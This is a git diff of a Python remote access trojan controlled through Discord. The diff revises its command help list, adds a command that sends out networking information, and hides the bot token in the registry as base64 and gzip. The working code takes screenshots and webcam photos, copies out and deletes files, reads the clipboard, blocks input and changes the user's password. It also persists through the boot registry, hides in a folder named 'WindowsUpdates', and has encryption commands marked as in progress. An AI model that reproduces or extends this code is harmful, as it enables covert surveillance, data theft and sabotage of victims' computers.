@@ -8,6 +8,8 @@ import sys
 from shutil import copy;
 import winshell
 from win32com.client import Dispatch
+import base64
+import gzip
 
 #TODO
 # - Add more commands
@@ -17,6 +19,8 @@ from win32com.client import Dispatch
 modules_path = os.getcwd() + "\modules"
 client = discord.Client(intents=discord.Intents.all())
 #boot_path = os.getenv("APPDATA") + "\Microsoft\Windows\Start Menu\Programs\Startup"
+
+
 
 def load_modules():
     for module in os.listdir(modules_path):
@@ -41,18 +45,6 @@ async def on_ready():
     print(f"Bot started. Version: " + "1.0.6")
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
-    """
-    if os.path.exists(f"{boot_path}\Run.lnk") == False:
-        target = __file__
-        shell = Dispatch('WScript.Shell')
-        shortcut = shell.CreateShortCut(f"{boot_path}\Run.lnk")
-        shortcut.Targetpath = target
-        shortcut.WorkingDirectory = target
-        shortcut.save()
-    """
-
-    #ENCRYPTION KEY STORE REGISTRY
-
 
 @client.event
 async def on_message(message):
@@ -61,35 +53,39 @@ async def on_message(message):
 
     #HELP
     if message.content.startswith(".help"):
-        await message.delete()
-        commandlist = """
-            .pcinfo - Fetch information about the computer using the systeminfo command in command prompt.
-            .hardware - Fetch information about the computer's hardware using WMIC. [GPU/CPU Name, HWID, RAM Capacity, Disk Capacity]
-            .shutdown - Shutdown the computer.
-            .dir - List the specified directory's files. Usage: .dir <full path>
-            .tasklist - List all tasks with a specific name. Usage: .tasklist <program name>. Example: .tasklist opera.exe
-            .taskkill - Kill a specified task. Usage: .taskkill <PID>
-            .screenshot - Take a screenshot.
-            .open - Open a specified file. Usage: .open <full file path>. Example: .open c:/Users/user/Desktop/textfile.txt
-            .copy - Copy a specified file. Usage: .copy <full file path>. Example: .copy c:/Users/user/Desktop/textfile.txt
-            .bsod - Trigger a BSOD.
-            .changepassword - Change the user's password. Usage: .changepassword <new password>
-            .webcam - Take a picture using the webcamera.
-            .logout - Logout the user from the computer.
-            .delete - Delete a specified file. Usage: .delete <full file path>. Example: .delete c:/Users/user/Desktop/textfile.txt
-            .upload - Upload a file to the computer. Usage: .upload <full file path>. You need to use the file that you want to upload as message attachment. Example: .upload c:/Users/user/Desktop/textfile.txt <attachment>
-            .hid - Siumlates keyboard. Usage: .hid write <text> - writes text, .hid press <key> - simulates keypress, .hid hotkey <key1> <key2> - simulates keypresses of key1 and key2 at the same time.
-            Examples: .hid write hello there - writes "hello there", .hid press enter - simulates keypress of enter key, .hid hotkey win r - simulates hotkey win + r.
-            .blockinput - Block all input from the user's keyboard and mouse.
-            .unblockinput - Unblock all input from the user's keyboard and mouse.
-            .selfdestruct - Run a .bat file that removes the bot and all it's features from the computer.
-            .deletedir - Delete a directory. Usage: .deletedir <full dir path>. Example: .deletedir c:/Users/user/Desktop/MyFolder
-            .createdir - Create a directory. Usage: .createdir <new dir path>. Example .createdir c:/Users/user/Desktop/MyNewFolder
-            .modules - List/run module(s) in the /modules folder. Usage: .modules <list/load> <if load, specify either file_name.py or "all">
-            .clipboard - Get/set the current clipboard item. Usage: .clipboard <get/set> <if you used ".clipboard set" parse the text to put into clipboard here> Note: .clipboard get returns the CURRENT copied text, not the whole history.
-        """
-        embed = discord.Embed(title="Command list", description=commandlist)
-        await message.channel.send(embed=embed)
+        embed = discord.Embed(title="Command list", description="", color=0x00ff00)
+        embed.add_field(name=".help", value="Shows this message.", inline=False)
+        embed.add_field(name=".pcinfo", value="Shows computer information.", inline=False)
+        embed.add_field(name=".hardware", value="Shows hardware information [CPU, GPU, HWID, RAM, Disk size]", inline=False)
+        embed.add_field(name=".dir", value="Shows directory contents.", inline=False)
+        embed.add_field(name=".open", value="Opens file on the host computer. Usage: ``.open <file path>``", inline=False)
+        embed.add_field(name=".upload", value="Uploads a file to the host computer. Usage: ``.upload <target_path>`` [File to upload is the attachment given with the message.]", inline=False)
+        embed.add_field(name=".tasklist", value="Shows current tasks running on the computer.", inline=False)
+        embed.add_field(name=".taskkill", value="Kills a specified task. Usage: ``.taskkill <PID>``", inline=False)
+        embed.add_field(name=".screenshot", value="Takes ascreenshot.", inline=False)
+        embed.add_field(name=".copy", value="Copies a file from the computer and sends it. Usage: ``.copy <file_path>``", inline=False)
+        embed.add_field(name=".bsod", value="BSOD's the host computer.", inline=False)
+        embed.add_field(name=".changepassword", value="Changes the account password. Usage: ``.changepassword <password>``", inline=False)
+        embed.add_field(name=".webcam", value="Takes a webcam picture.", inline=False)
+        embed.add_field(name=".logout", value="Logs the user out.", inline=False)
+        embed.add_field(name=".delete", value="Deletes a specified file. Usage: ``.delete <target_file_path>``", inline=False)
+        embed.add_field(name=".hid", value="Executes HID. ``.hid write <text>`` => writes the specified text. ``.hid hotkey <key1> <key2>`` => Presses two keys at the same time.", inline=False)
+        embed.add_field(name=".blockinput", value="Blocks user's input.", inline=False)
+        embed.add_field(name=".unblockinput", value="Unblocks user's input", inline=False)
+        embed.add_field(name=".modules", value="Module loader. ``.modules list`` => Show current modules in the ``./modules`` folder. ``.modules load <module_name.py / all>``", inline=False)
+        embed.add_field(name=".clipboard", value="Get/Set clipboard content.", inline=False)
+        embed.add_field(name=".setup", value="RUN BEFORE USING ENCRYPTION METHODS! Inserts itself into boot registry, creates an encryption key and stores it into the registry.", inline=False)
+        embed.add_field(name=".encrypt", value="Encrypt file [WIP]", inline=False)
+        embed.add_field(name=".decrypt", value="Decrypt file [WIP]", inline=False)
+        embed.add_field(name=".selfdestruct", value="Self destruct.", inline=False)
+        embed.add_field(name=".shutdown", value="Shutdown the computer.", inline=False)
+        embed.add_field(name=".deletedir", value="Deletes a specified directory. Usage: ``.deletedir <target_folder>``", inline=False)
+        embed.add_field(name=".createdir", value="Creates a specified directory. Usage: ``.createdir <folder_path>˙", inline=False)
+        try:
+            await message.channel.send(embed=embed)
+        except Exception as e:
+            print(e)
+            await message.channel.send("Embed failed, try again.")
 
     #SELF DESTRUCT
     if message.content.startswith(".selfdestruct"):
@@ -414,20 +410,18 @@ async def on_message(message):
         embed = discord.Embed(title="Setup", description="Setup successful.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
-    #ENCRYPT FILE
-    if message.content.startswith(".encrypt"):
+        #NETWORKING
+    if message.content.startswith(".networking"):
         await message.delete()
         try:
-            files.encrypt_file(message.content.replace(".encrypt ", ""), reg_h.get_enc_key())
+            pc.networking_info()
         except Exception as e:
             print(e)
-            embed = discord.Embed(title="Encrypt", description="Failed to encrypt file. Did you run '.setup?'", color=0x00ff00)
-            await message.channel.send(embed=embed)
+            embed = discord.Embed(title="Networking", description="Failed to get networking information.", color=0x00ff00)
             return
-        embed = discord.Embed(title="Encrypt", description="File encrypted.", color=0x00ff00)
+        embed = discord.Embed(title="Networking", description="Networking information fetched.", color=0x00ff00)
         await message.channel.send(embed=embed)
-
-    #DECRYPT FILE 
-token = sys.argv[1]
-client.run(token)
+        await message.channel.send(file=discord.File("networking_info.txt"))
+        os.remove("networking_info.txt")
+client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode('utf-8'))
 #use py main.py <token> to run
